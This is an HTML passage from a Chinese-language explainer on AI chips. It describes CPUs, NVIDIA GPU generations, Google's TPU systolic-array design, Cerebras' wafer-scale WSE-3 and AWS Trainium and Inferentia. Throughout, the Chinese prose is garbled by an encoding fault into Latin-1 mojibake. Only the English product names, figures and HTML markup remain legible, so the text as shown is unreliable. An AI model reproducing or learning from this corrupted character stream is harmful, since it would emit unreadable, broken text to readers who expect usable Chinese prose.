<p>åœ¨ç°ä»£å¤„ç†å™¨ä¸­ï¼Œè¿™ä¸€è¿‡ç¨‹æ¯ç§’å¯å‘ç”Ÿæ•°åäº¿æ¬¡ï¼Œå¤šä¸ªæ ¸å¿ƒä¸çº¿ç¨‹å¹¶è¡Œå·¥ä½œæå‡æ€§èƒ½ï¼Œä½¿ CPU å¦‚åŒä¸€ä¸ªé«˜åº¦ååŒçš„ç»„ä»¶å›¢é˜Ÿã€‚CPU æ ¸å¿ƒæ•°é‡è¾ƒå°‘ï¼ˆä¾‹å¦‚ 1 åˆ° 2 ä¸ªï¼‰æ—¶ï¼Œé€šå¸¸æ›´æ³¨é‡èƒ½æ•ˆï¼ˆå³å•ä½åŠŸè€—ä¸‹å®Œæˆæ›´å¤šæœ‰æ•ˆå·¥ä½œï¼‰ï¼Œé€‚åˆè½»é‡æˆ–æ—¥å¸¸ä»»åŠ¡ï¼Œè€Œæ ¸å¿ƒæ•°é‡è¾ƒå¤šçš„ CPU åˆ™ç”¨äºæ”¯æ’‘é«˜æ€§èƒ½ã€é«˜è´Ÿè½½çš„ä»»åŠ¡ã€‚</p>
<p>å¦‚ä»Šçš„ CPU ä¸»è¦æ¥è‡ªä»¥ä¸‹å‚å•†ï¼š</p>
<ul>
<li>Intelï¼Œäº§å“åŒ…æ‹¬ Core ç³»åˆ—ï¼ˆæ¶ˆè´¹çº§ï¼‰ã€Xeonï¼ˆæœåŠ¡å™¨/å·¥ä½œç«™ï¼‰ã€Pentium å’Œ Celeronï¼ˆå…¥é—¨çº§ï¼‰èŠ¯ç‰‡ï¼›</li>
<li>AMDï¼Œæä¾› Ryzenï¼ˆæ¶ˆè´¹çº§/é«˜æ€§èƒ½ï¼‰å’Œ EPYCï¼ˆæœåŠ¡å™¨ï¼‰å¤„ç†å™¨ï¼Œä»¥åŠ APUï¼ˆAccelerated Processing Unitï¼‰ï¼Œå®ƒå°† CPU å’Œ GPU é›†æˆåœ¨åŒä¸€é¢—èŠ¯ç‰‡ä¸Šï¼ˆæˆ‘ä»¬ç¨åä¼šè¯¦ç»†è®¨è®ºï¼‰ã€‚</li>
</ul>
<p>CPU ç”¨äº AI æ—¶é¢ä¸´çš„ä¸»è¦é—®é¢˜æ˜¯ï¼š<strong>å®ƒé’ˆå¯¹çš„æ˜¯é¡ºåºæ‰§è¡Œçš„é€šç”¨ä»»åŠ¡ï¼Œè€Œéå¤§è§„æ¨¡å¹¶è¡Œçš„çŸ©é˜µè¿ç®—ï¼Œå› æ­¤åœ¨é€Ÿåº¦å’Œèƒ½æ•ˆä¸Šè¿œé€Šäº GPU æˆ–ä¸“ç”¨èŠ¯ç‰‡ã€‚</strong></p>
<p>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬è½¬å‘ä»‹ç»ç¬¬äºŒæ¬¾èŠ¯ç‰‡ â€”â€” è‘—åçš„ GPUã€‚</p>
<h3 data-id="heading-3"><strong>1.2 å›¾å½¢å¤„ç†å•å…ƒï¼ˆGraphics Processing Unit, GPUï¼‰</strong></h3>
<p>å›¾å½¢å¤„ç†å•å…ƒï¼ˆGPUï¼‰ä¸“ä¸ºé«˜ååé‡çš„å¤§è§„æ¨¡å¹¶è¡Œæ•°æ®å¤„ç†è€Œä¼˜åŒ–ã€‚GPU æœ€åˆè¢«å‘æ˜ç”¨äºåŠ é€Ÿå›¾åƒå’Œè§†é¢‘ä¸­çš„è®¡ç®—æœºå›¾å½¢æ¸²æŸ“ï¼Œä½†åæ¥äººä»¬å‘ç°å®ƒåœ¨éå›¾å½¢è®¡ç®—ä»»åŠ¡ä¸­åŒæ ·å¤§æœ‰ç”¨æ­¦ä¹‹åœ°ã€‚å¦‚ä»Šï¼ŒGPU è¢«å¹¿æ³›åº”ç”¨äºå¯å¹¶è¡ŒåŒ–çš„å·¥ä½œè´Ÿè½½ï¼Œä¾‹å¦‚å¤„ç†æ•°æ®å¯†é›†å‹ä»»åŠ¡å’Œè®­ç»ƒ AI æ¨¡å‹ã€‚</p>
<p>å¦‚ä»Šï¼ŒGPU æ˜¯æ¨åŠ¨ AI æ€§èƒ½æå‡çš„æ ¸å¿ƒåŠ›é‡ï¼Œä¹Ÿæ˜¯è¡¡é‡ AI è®¡ç®—èƒ½åŠ›çš„ä¸€é¡¹å…³é”®æŒ‡æ ‡ã€‚</p>
<p>â€œå›¾å½¢å¤„ç†å•å…ƒâ€ï¼ˆGPUï¼‰è¿™ä¸€æœ¯è¯­ç”± NVIDIA äº 1999 å¹´æ­£å¼æå‡ºï¼Œéš GeForce 256 æ˜¾å¡ä¸€åŒå‘å¸ƒã€‚NVIDIA ç§°å…¶ä¸ºå…¨çƒé¦–æ¬¾ GPUï¼Œå…¶å®˜æ–¹å®šä¹‰ä¸ºï¼šâ€œé›†æˆå˜æ¢ã€å…‰ç…§ã€ä¸‰è§’å½¢è®¾ç½®/è£å‰ªåŠæ¸²æŸ“å¼•æ“çš„å•èŠ¯ç‰‡å¤„ç†å™¨ã€‚â€</p>
<p>é‚£ä¹ˆï¼Œè¿™æ¬¾ä¼ å¥‡çš„ GPU ç©¶ç«Ÿæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿâ†’</p>
<p>GPU å†…éƒ¨æ˜¯ä¸€å—ç¡…èŠ¯ç‰‡ï¼Œä¸Šé¢èš€åˆ»ç€æ•°åäº¿ä¸ªå¾®å‹æ™¶ä½“ç®¡ï¼Œè¢«ç»„ç»‡æˆæ•°åƒä¸ªè½»é‡çº§å¤„ç†æ ¸å¿ƒã€‚è¿™äº›æ ¸å¿ƒé€šè¿‡å¤æ‚çš„å¸ƒçº¿ç›¸äº’è¿æ¥ï¼Œå¹¶ç”±é«˜å¸¦å®½å†…å­˜å’Œç¼“å­˜æä¾›æ”¯æŒï¼Œä½¿æ•°æ®èƒ½åœ¨æ ¸å¿ƒä¹‹é—´é«˜é€ŸæµåŠ¨ã€‚æ•´ä¸ªèŠ¯ç‰‡è¢«å°è£…åœ¨ä¿æŠ¤ææ–™ä¸­ï¼Œå¹¶é…æœ‰æ•£çƒ­ç³»ç»Ÿæ¥ç»´æŒç¨³å®šè¿è¡Œã€‚</p>
<p>ï¼ˆäº†è§£èŠ¯ç‰‡å†å²çš„æœ€ä½³è¯»ç‰©ä¹‹ä¸€æ˜¯å…‹é‡Œæ–¯Â·ç±³å‹’ï¼ˆChris Millerï¼‰æ‰€è‘—çš„ã€ŠèŠ¯ç‰‡æˆ˜äº‰ï¼šä¸–ç•Œæœ€å…³é”®æŠ€æœ¯çš„äº‰å¤ºæˆ˜ã€‹ï¼ˆChip War: The Fight for the Worldâ€™s Most Critical Technologyï¼‰ï¼Œå¼ºçƒˆæ¨èã€‚ï¼‰</p>
<p>ä¸ CPU ä¸åŒï¼ŒGPU ä¸“ä¸ºå¹¶è¡Œè®¡ç®—è€Œç”Ÿ â€”â€” å®ƒä¼šå°†ä¸€é¡¹å¤§å‹ä»»åŠ¡æ‹†åˆ†æˆæˆåƒä¸Šä¸‡ä¸ªæ›´å°ã€å½¼æ­¤ç‹¬ç«‹çš„å­ä»»åŠ¡ï¼Œå¹¶å°†å®ƒä»¬åˆ†å‘åˆ°å„ä¸ªæ ¸å¿ƒä¸ŠåŒæ­¥è®¡ç®—ã€‚æ­£å› å¦‚æ­¤ï¼ŒGPU éå¸¸é€‚åˆè®­ç»ƒå’Œè¿è¡Œ AI æ¨¡å‹ï¼Œå› ä¸ºè¿™äº›æ¨¡å‹æ¶‰åŠå¯¹æµ·é‡æ•°æ®é›†è¿›è¡Œé‡å¤çš„çŸ©é˜µä¸å¼ é‡è¿ç®—ã€‚å¾—ç›Šäº GPU çš„å¹¶è¡Œæ¶æ„ï¼ŒåŸæœ¬éœ€è¦æ•°æœˆçš„è®­ç»ƒå¦‚ä»Šå‡ å¤©å°±èƒ½å®Œæˆï¼Œæ¨ç†é€Ÿåº¦ä¹Ÿè¶³ä»¥æ”¯æ’‘å®æ—¶åº”ç”¨ â€”â€” æ¯”å¦‚èŠå¤©æœºå™¨äººã€‚</p>
<p>å…¨çƒ GPU ç”Ÿäº§çš„é¢†å†›è€…æ˜¯ NVIDIAï¼Œå®ƒæ‰“é€ äº†å®Œæ•´çš„å¹¶è¡Œè®¡ç®—å¹³å° CUDAï¼ˆCompute Unified Device Architectureï¼‰ï¼Œå°† GPU ç¡¬ä»¶èƒ½åŠ›é‡Šæ”¾åˆ°é€šç”¨è®¡ç®—é¢†åŸŸï¼Œå¤§å¹…é™ä½äº† GPU ç¼–ç¨‹çš„é—¨æ§›ã€‚</p>
<p>NVIDIA é¢å‘ AI åŸºç¡€è®¾æ–½å’Œè¡Œä¸šåº”ç”¨çš„ä¸»è¦ GPU äº§å“åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>V100ï¼ˆVolta æ¶æ„ï¼‰</strong> Â â€“ ä¸“ä¸ºæ·±åº¦å­¦ä¹ åŠ é€Ÿè€Œè®¾è®¡ï¼Œé¦–æ¬¡å¼•å…¥ Tensor Coreï¼ˆå¼ é‡æ ¸å¿ƒï¼‰ â€”â€” ä¸“ç”¨äºåŠ é€Ÿ AI è®­ç»ƒä¸­çŸ©é˜µè¿ç®—çš„ç¡¬ä»¶å•å…ƒã€‚</li>
<li><strong>A100ï¼ˆAmpere æ¶æ„ï¼‰</strong> Â â€“ æ‹¥æœ‰æ›´å¤š Tensor Coreã€æ›´é«˜å†…å­˜å¸¦å®½ï¼Œå¹¶æ”¯æŒå¤šå®ä¾‹ GPUï¼ˆMIGï¼‰æŠ€æœ¯ï¼Œå¯å°†ä¸€å—ç‰©ç† GPU åˆ’åˆ†ä¸ºå¤šä¸ªé€»è¾‘ GPUï¼Œæå‡èµ„æºåˆ©ç”¨æ•ˆç‡ã€‚</li>
<li><strong>H100ã€H200ï¼ˆHopper æ¶æ„ï¼‰</strong> Â â€“ å½“å‰ AI é¢†åŸŸçš„è¡Œä¸šæ ‡å‡†ã€‚H ç³»åˆ—æ”¯æŒ Transformer Engineã€è¶…å¤§å†…å­˜å¸¦å®½ï¼Œä»¥åŠæè‡´çš„è®­ç»ƒä¸æ¨ç†é€Ÿåº¦ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6352519dc001427c80a82a672d7b5a47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930988&amp;x-signature=tXzzbTwgXULy5EgEQ33J35UX3RU%3D" alt="image.png" loading="lazy"/></p>
<p>å›¾ç‰‡æ¥æºï¼šNVIDIA H100 NVL GPU äº§å“æ–‡æ¡£</p>
<ul>
<li><strong>Blackwellï¼ˆä¾‹å¦‚ B200 å’Œ GB200 Grace-Blackwell â€œè¶…çº§èŠ¯ç‰‡â€ï¼‰</strong> ä¸“ä¸ºä¸‹ä¸€ä»£æ‹¥æœ‰æ•°ä¸‡äº¿ç”šè‡³åä¸‡äº¿çº§å‚æ•°çš„ AI æ¨¡å‹è€Œè®¾è®¡ã€‚ä½œä¸º Hopper æ¶æ„çš„ç»§ä»»è€…ï¼Œå®ƒå¼•å…¥äº† FP4 ç²¾åº¦ï¼Œå¹¶åœ¨æ¨ç†ååé‡ä¸Šå®ç°äº†å¤§å¹…æå‡ï¼Œå°¤å…¶é’ˆå¯¹è¶…å¤§è§„æ¨¡ Transformer å·¥ä½œè´Ÿè½½ã€‚</li>
</ul>
<p>éšç€è¡Œä¸šå¯¹ AI ä¸“ç”¨å¤„ç†å™¨çš„éœ€æ±‚æ—¥ç›Šå¢é•¿ï¼Œç¬¬ä¸‰ç±»æ ¸å¿ƒç¡¬ä»¶ â€”â€” TPU åº”è¿è€Œç”Ÿã€‚</p>
<h3 data-id="heading-4"><strong>1.3 å¼ é‡å¤„ç†å•å…ƒï¼ˆTensor Processing Unit, TPUï¼‰</strong></h3>
<p>å¼ é‡å¤„ç†å•å…ƒï¼ˆTPUï¼‰æ˜¯ç”± Google ä¸“ä¸ºåŠ é€Ÿç¥ç»ç½‘ç»œè¿ç®—ï¼ˆå°¤å…¶æ˜¯çŸ©é˜µä¹˜æ³•ä¸æœºå™¨å­¦ä¹ å·¥ä½œæµï¼‰å®šåˆ¶çš„èŠ¯ç‰‡ã€‚å®ƒæœ€åˆåœ¨ 2016 å¹´ Google I/O å¤§ä¼šä¸Šäº®ç›¸ï¼Œå±äº ASICï¼ˆApplication-Specific Integrated Circuitsï¼Œä¸“ç”¨é›†æˆç”µè·¯ï¼‰ç±»åˆ«ã€‚TPU çš„åŸºæœ¬æ¶æ„å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8044bca4ab3747fb968b5a88c360411d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930988&amp;x-signature=SKz600s%2FFc6vqntRDUxdvt5H1Yk%3D" alt="image.png" loading="lazy"/></p>
<p>å›¾ç‰‡æ¥æºï¼šè®ºæ–‡ã€ŠIn-Datacenter Performance Analysis of a Tensor Processing Unitã€‹</p>
<ul>
<li>å…¶æ ¸å¿ƒç»„ä»¶æ˜¯çŸ©é˜µä¹˜æ³•å•å…ƒï¼ˆMatrix Multiply Unitï¼‰ â€”â€” ä¸€ä¸ªå·¨å¤§çš„ 256Ã—256 ä¹˜åŠ å•å…ƒï¼ˆMACï¼‰é˜µåˆ—ï¼Œé‡‡ç”¨è„‰åŠ¨é˜µåˆ—ï¼ˆsystolic arrayï¼‰ç»“æ„ï¼Œæ•°æ®ä»¥â€œæ³¢â€çš„å½¢å¼åœ¨ç½‘æ ¼ä¸­æµåŠ¨ã€‚</li>
<li>TPU è¿˜é…å¤‡äº†å¤§å®¹é‡ç‰‡ä¸Šå­˜å‚¨å™¨ï¼š</li>
</ul>

<ul>
<li>
<ul>
<li>ç»Ÿä¸€ç¼“å†²åŒºï¼ˆUnified Bufferï¼Œ24 MBï¼‰ï¼šç”¨äºå­˜æ”¾ä¸­é—´æ¿€æ´»å€¼ï¼›</li>
<li>æƒé‡å­˜å‚¨å™¨/ FIFOï¼ˆWeight Memory/FIFOsï¼‰ï¼šç”¨äºå­˜å‚¨ç¥ç»ç½‘ç»œæƒé‡ï¼›</li>
<li>ç´¯åŠ å™¨ï¼ˆAccumulatorsï¼Œ4 MBï¼‰ï¼šç”¨äºæ”¶é›†æ±‚å’Œç»“æœã€‚</li>
<li>æ§åˆ¶é€»è¾‘ã€PCIe æ¥å£å’Œæ¿€æ´»å•å…ƒï¼ˆç”¨äº ReLUã€sigmoid ç­‰å‡½æ•°ï¼‰ä¸ºçŸ©é˜µå¼•æ“æä¾›æ”¯æŒï¼Œä½†èŠ¯ç‰‡çš„å¤§éƒ¨åˆ†é¢ç§¯éƒ½ç”¨äºåŸå§‹è®¡ç®—å’Œé«˜é€Ÿæ•°æ®ä¼ è¾“ã€‚</li>
</ul>
</li>
</ul>
<p>TPU çš„ä¸»è¦ç‰¹ç‚¹æ˜¯ä½œä¸ºåå¤„ç†å™¨å·¥ä½œï¼š</p>
<ul>
<li>ä¸»æœº CPU é€šè¿‡ PCIe å‘ TPU å‘é€æŒ‡ä»¤ï¼ŒTPU ç›´æ¥æ‰§è¡Œè¿™äº›æŒ‡ä»¤ã€‚</li>
<li>å…¶æŒ‡ä»¤é›†éå¸¸ç²¾ç®€ï¼ˆä»…çº¦åå‡ æ¡æŒ‡ä»¤ï¼‰ï¼Œç¡¬ä»¶é€šè¿‡æµæ°´çº¿è®¾è®¡ç¡®ä¿çŸ©é˜µå•å…ƒå§‹ç»ˆå¤„äºå¿™ç¢ŒçŠ¶æ€ã€‚</li>
<li>åƒ TensorFlow è¿™æ ·çš„æ¡†æ¶ä¼šå°†æ¨¡å‹ç¼–è¯‘æˆè¿™äº›åº•å±‚æŒ‡ä»¤ã€‚</li>
</ul>
<p>256 ä¸ªå°å‹ç‰‡ä¸Šå­˜å‚¨å™¨ï¼ˆåˆ†å¸ƒå¼ç´¯åŠ å™¨ RAMï¼‰ç”¨äºæ”¶é›†éƒ¨åˆ†å’Œï¼Œè€Œè„‰åŠ¨é˜µåˆ—åˆ™æ‰§è¡Œä¹˜åŠ ï¼ˆMACï¼‰è¿ç®—ã€‚é€šè¿‡å°†æƒé‡å’Œæ•°æ®æŒç»­æµå…¥è„‰åŠ¨é˜µåˆ—ï¼Œå¹¶åœ¨ç‰‡ä¸Šç¼“å†²åŒºä¸­æœ¬åœ°å¤ç”¨ï¼ŒTPU æœ€å¤§é™åº¦åœ°å‡å°‘äº†å¯¹ç‰‡å¤–å†…å­˜çš„è®¿é—®ã€‚å› æ­¤ï¼Œå¤§éƒ¨åˆ†è®¡ç®—ä»»åŠ¡ï¼ˆé€å±‚è¿›è¡Œï¼‰éƒ½èƒ½ç›´æ¥åœ¨èŠ¯ç‰‡ä¸Šå®Œæˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a12c71695d54079bf56c1fbf1f40991~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930988&amp;x-signature=bpCoRBbY%2Bb3FKYhivhCZ6c05g4E%3D" alt="image.png" loading="lazy"/></p>
<p>å›¾ç‰‡æ¥æºï¼šè®ºæ–‡ã€ŠIn-Datacenter Performance Analysis of a Tensor Processing Unitã€‹</p>
<p>æ€»ç»“æ¥è¯´ï¼Œ<strong>TPU ä¸­çš„æ¯ä¸ªå•å…ƒæ‰§è¡Œå°è§„æ¨¡è®¡ç®—ï¼Œå¹¶å°†éƒ¨åˆ†ç»“æœä¼ é€’ä¸‹å»ï¼Œä»è€ŒèŠ‚çœåŠŸè€—ï¼Œå¹¶æå¤§åŠ å¿« AI æ¨¡å‹èƒŒåçš„æ•°å­¦è¿ç®—é€Ÿåº¦ã€‚</strong> è¿™æ­£æ˜¯ TPU åœ¨ç›¸åŒä»»åŠ¡ä¸­èƒ½å®ç°é«˜ååé‡ï¼ŒåŒæ—¶åŠŸè€—è¿œä½äº CPU/GPU çš„åŸå› ã€‚æ ¹æ® Google 2017 å¹´çš„åˆ†æï¼ŒTPU åœ¨èƒ½æ•ˆæ¯”ï¼ˆæ¯ç“¦æ€§èƒ½ï¼‰ä¸Šæ¯”åŒæœŸ CPU å’Œ GPU é«˜å‡ºçº¦ 30â€“80 å€ï¼ˆåœ¨æ¨ç†ä»»åŠ¡ä¸­ï¼Œæ‹¿ TPU å’Œ K80 è¿™ç±» GPU åšèƒ½æ•ˆå¯¹æ¯”ï¼‰ã€‚</p>
<p>ç„¶è€Œï¼Œä»…é è¿™ä¸‰ç§ç¡¬ä»¶ï¼ˆCPUã€GPUã€TPUï¼‰ï¼Œæˆ‘ä»¬ä»æ— æ³•å…¨é¢ç†è§£é©±åŠ¨ AI å‘å±•çš„å…¨éƒ¨æŠ€æœ¯åŠ›é‡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¿˜éœ€æ¢³ç†æ•´ä¸ªé¢†åŸŸè¿˜æœ‰å“ªäº›æŠ€æœ¯å¯ä¾›é€‰æ‹©ã€‚ç”±äº TPU å±äº ASIC ç±» AI èŠ¯ç‰‡ï¼Œæˆ‘ä»¬å°†ä»è¿™ä¸€ç±»åˆ«å‡ºå‘ï¼Œæ¢ç´¢æ›´å¤šå¼ºæœ‰åŠ›çš„æ›¿ä»£æ–¹æ¡ˆã€‚æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬æ¥æ·±å…¥çœ‹çœ‹å®ƒä»¬å¦‚ä½•æ„æƒ³æœªæ¥ â†’</p>
<h2 data-id="heading-5"><strong>02 ä¸“ç”¨é›†æˆç”µè·¯ï¼ˆApplication-Specific Integrated Circuits, ASICsï¼‰</strong></h2>
<p>ASIC æ˜¯å®Œå…¨å®šåˆ¶çš„ç¡…èŠ¯ç‰‡ï¼Œä¸“ä¸ºæŸä¸€ç§ç‰¹å®šçš„ AI å·¥ä½œè´Ÿè½½è€Œè®¾è®¡ã€‚è¿™ç±»èŠ¯ç‰‡æ—¢åŒ…æ‹¬äº‘æœåŠ¡å·¨å¤´çš„è‡ªç ”èŠ¯ç‰‡ï¼Œä¹Ÿæ¶µç›–åˆåˆ›ä¼ä¸šæ‰“é€ çš„ä¸“ç”¨ AI ç¡¬ä»¶ã€‚åœ¨è¿™ä¸€é¢†åŸŸï¼Œæˆ‘ä»¬ä¸å¾—ä¸æåŠâ€¦â€¦</p>
<h3 data-id="heading-6"><strong>2.1 Cerebras æ™¶åœ†çº§å¼•æ“ï¼ˆWafer-Scale Engine, WSEï¼‰</strong></h3>
<p>Cerebras å°†æœªæ¥æŠ¼æ³¨äºæ™¶åœ†çº§èŠ¯ç‰‡ã€‚å…¶æœ€æ–°æ¬¾ Cerebras WSE-3 èŠ¯ç‰‡å®é™…ä¸Šæ˜¯å²ä¸Šå°ºå¯¸æœ€å¤§çš„ AI èŠ¯ç‰‡ä¹‹ä¸€ â€”â€” é¢ç§¯é«˜è¾¾ 46,255 mmÂ²ã€‚å…¶æ ¸å¿ƒæŠ€æœ¯åœ¨äºï¼š<strong>Cerebras å°†æ•´ç‰‡ç¡…æ™¶åœ†ç›´æ¥åˆ¶æˆä¸€é¢—èŠ¯ç‰‡ï¼Œè€Œä¸æ˜¯åƒä¼ ç»Ÿ CPU æˆ– GPU é‚£æ ·å°†æ™¶åœ†åˆ‡å‰²æˆæ•°ç™¾ä¸ªå°å¤„ç†å™¨ã€‚</strong></p>
<p>WSE-3 åŒ…å« 4 ä¸‡äº¿ä¸ªæ™¶ä½“ç®¡ã€90 ä¸‡ä¸ªä¸“ä¸º AI ä¼˜åŒ–çš„æ ¸å¿ƒï¼Œä»¥åŠ 44 GB ç‰‡ä¸Š SRAM å†…å­˜ã€‚æ¯ä¸ªæ ¸å¿ƒéƒ½é…å¤‡æœ‰ç‹¬ç«‹çš„æœ¬åœ°å†…å­˜ï¼Œå¹¶é€šè¿‡æ¨ªè·¨æ•´ä¸ªæ™¶åœ†çš„è¶…é«˜å¸¦å®½äº’è¿ç½‘ç»œï¼ˆfabricï¼‰å½¼æ­¤è¿æ¥ï¼Œä»è€Œå¤§å¹…ç¼©çŸ­è®¡ç®—å•å…ƒä¸å†…å­˜ä¹‹é—´çš„è·ç¦»ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba80e99b5a4b4e86848ce97984f8a9b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930988&amp;x-signature=4uM7jmxiSbfGfGIrrdnzemGJngo%3D" alt="image.png" loading="lazy"/></p>
<p>å›¾ç‰‡æ¥æºï¼šCerebras Wafer-Scale Engine (WSE) äº§å“æ‰‹å†Œ</p>
<p>Cerebras çš„æ™¶åœ†çº§ç†å¿µå¸¦æ¥äº†ä»¤äººç©ç›®çš„æˆæœï¼š</p>
<ul>
<li>å•é¢— WSE-3 å¯æä¾› 125 petaFLOPS çš„ AI ç®—åŠ›ã€‚</li>
<li>æ® Cerebras å£°ç§°ï¼Œå°† WSE-3 ç»„åˆæˆæ™¶åœ†çº§é›†ç¾¤ï¼ˆWafer-Scale Cluster, WSCï¼‰ï¼Œå¹¶é›†æˆ MemoryXï¼ˆç”¨äºå­˜å‚¨è¶…å¤§æ¨¡å‹æƒé‡çš„ç‰‡å¤–å­˜å‚¨ï¼‰å’Œ SwarmXï¼ˆç”¨äºåœ¨èŠ‚ç‚¹é—´å¹¿æ’­æƒé‡å¹¶èšåˆæ¢¯åº¦ï¼‰ï¼Œå³å¯é«˜æ•ˆæ”¯æŒæ•°ä¸‡äº¿å‚æ•°æ¨¡å‹çš„è®­ç»ƒï¼Œä¸”å‡ ä¹èƒ½éšç¡¬ä»¶è§„æ¨¡çº¿æ€§æå‡æ€§èƒ½ï¼ŒåŒæ—¶è§„é¿ä¼ ç»Ÿ GPU é›†ç¾¤ä¸­å¤æ‚çš„é€šä¿¡å¼€é”€ã€‚</li>
</ul>
<p><strong>ç›®å‰æœ‰å“ªäº›æ¨¡å‹å·²åœ¨ Cerebras WSE ä¸Šè¿è¡Œï¼Ÿ</strong> ä»¥ä¸‹æ˜¯ä¸¤ä¸ªå…¸å‹ç¤ºä¾‹ï¼š</p>
<p>1ï¼‰é˜¿é‡Œå·´å·´çš„ Qwen3 Coder 480B Instructï¼Œæ¨ç†é€Ÿåº¦è¾¾åˆ° æ¯ç§’ 2,000 ä¸ª tokenã€‚</p>
<p>2ï¼‰æ··åˆä¸“å®¶æ¨¡å‹ï¼ˆMixture-of-Experts, MoEï¼‰ï¼šCerebras ä½¿å…¶å¤§è§„æ¨¡è®­ç»ƒå˜å¾—æ›´åŠ ç®€å•é«˜æ•ˆã€‚è¿™ç±»æ¨¡å‹å¯åœ¨å•ä¸ªè®¾å¤‡ä¸Šå®Œæˆè®­ç»ƒï¼Œæ— éœ€æ¨¡å‹å¹¶è¡Œï¼ˆè€Œä½¿ç”¨ GPU æ—¶é€šå¸¸å¿…é¡»ä¾èµ–æ¨¡å‹å¹¶è¡Œï¼‰ã€‚Cerebras é‡‡ç”¨çš„æ³¨æ„åŠ›æ‰¹å¤„ç†åˆ†å—ï¼ˆBatch Tiling on Attention, BTAï¼‰æŠ€æœ¯ï¼Œè§£å†³äº†ç¨€ç– MoE æ¨¡å‹çš„è®¡ç®—æ•ˆç‡é—®é¢˜ â€”â€” å®ƒå°†æ³¨æ„åŠ›å±‚ä¸ä¸“å®¶å±‚çš„æ‰¹å¤„ç†éœ€æ±‚è§£è€¦ï¼šæ³¨æ„åŠ›å±‚åœ¨è¾ƒå°çš„â€œåˆ†å—â€ï¼ˆtilesï¼‰ä¸Šè¿è¡Œï¼Œä»¥é™ä½å†…å­˜å‹åŠ›ï¼›ä¸“å®¶ç½‘ç»œåˆ™å¤„ç†æ›´å¤§çš„æœ‰æ•ˆæ‰¹æ¬¡ï¼Œç¡®ä¿å…¶æ ¸å¿ƒå§‹ç»ˆå¤„äºé«˜åˆ©ç”¨ç‡çŠ¶æ€ã€‚</p>
<p>ç”±æ­¤å¯è§ï¼Œè¿™æ˜¯ä¸€é¡¹ä»¥è§„æ¨¡åˆ¶èƒœçš„å¼ºå¤§æŠ€æœ¯ã€‚</p>
<h3 data-id="heading-7"><strong>2.2 AWS Trainium ä¸ AWS Inferentia</strong></h3>
<p>äºšé©¬é€ŠåŒæ ·æ¨å‡ºäº†çªç ´ GPU å„æ–­çš„æ›¿ä»£æ–¹æ¡ˆï¼Œå¹¶å½¢æˆäº†è‡ªå·±å¯¹é«˜æ•ˆç¡¬ä»¶çš„ç‹¬ç‰¹æ„æƒ³ã€‚å…¶ä¸¤æ¬¾è‡ªç ”èŠ¯ç‰‡ä¸“ä¸º AI å·¥ä½œè´Ÿè½½è®¾è®¡ï¼Œå¹¶æ·±åº¦é›†æˆäº AWS ç”Ÿæ€ç³»ç»Ÿä¹‹ä¸­ã€‚</p>
<p>AWS Trainium ä¸“ç”¨äºæ¨¡å‹è®­ç»ƒï¼ŒAWS Inferentia åˆ™é¢å‘æ¨ç†ä»»åŠ¡ã€‚<strong>è¿™ä¸¤æ¬¾èŠ¯ç‰‡å†…éƒ¨å‡é‡‡ç”¨å®šåˆ¶çš„ NeuronCoreã€é«˜å¸¦å®½å†…å­˜ï¼ˆHBMï¼‰ï¼Œä»¥åŠç”¨äºå¼ é‡è¿ç®—ã€é›†åˆé€šä¿¡å’Œç¨€ç–æ€§åŠ é€Ÿçš„ä¸“ç”¨å¼•æ“ã€‚</strong></p>
<p>é…å¤‡ 64 é¢— Trainium 2 èŠ¯ç‰‡çš„ Trainium 2 UltraServer æœåŠ¡å™¨ï¼Œåœ¨å¤„ç†ç¨€ç–æ¨¡å‹æ—¶ï¼Œæœ€é«˜å¯æä¾› 83.2 petaflops çš„ FP8 ç®—åŠ›ï¼›åœ¨å¤„ç†ç¨ å¯†æ¨¡å‹æ—¶ï¼ŒFP8 ç®—åŠ›çº¦ä¸º 20.8 petaflopsã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œå•é¢— NVIDIA H100 GPU çš„ FP8 ç®—åŠ›å¤§çº¦åªæœ‰ 4 petaflopsã€‚</p>
<p>AWS Inferentia 2 æ”¯æŒå¤§è§„æ¨¡éƒ¨ç½²å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰å’Œæ‰©æ•£æ¨¡å‹ï¼ˆdiffusion modelsï¼‰ï¼Œå…¶æ¯ç“¦æ€§èƒ½æ¯”åŸºäº GPU çš„åŒç±» EC2 å®ä¾‹ï¼ˆä¾‹å¦‚ G5 ç³»åˆ—ï¼‰æå‡çº¦ 50 %ã€‚</p>
<p>å› æ­¤ï¼ŒAWS ç¡¬ä»¶ä¸ºç”Ÿæˆå¼ AI çš„éœ€æ±‚æä¾›äº†åœ¨è§„æ¨¡ã€æ€§èƒ½ä¸æˆæœ¬æ•ˆç›Šä¸‰è€…ä¹‹é—´é«˜åº¦å¹³è¡¡çš„è§£å†³æ–¹æ¡ˆã€‚</p>
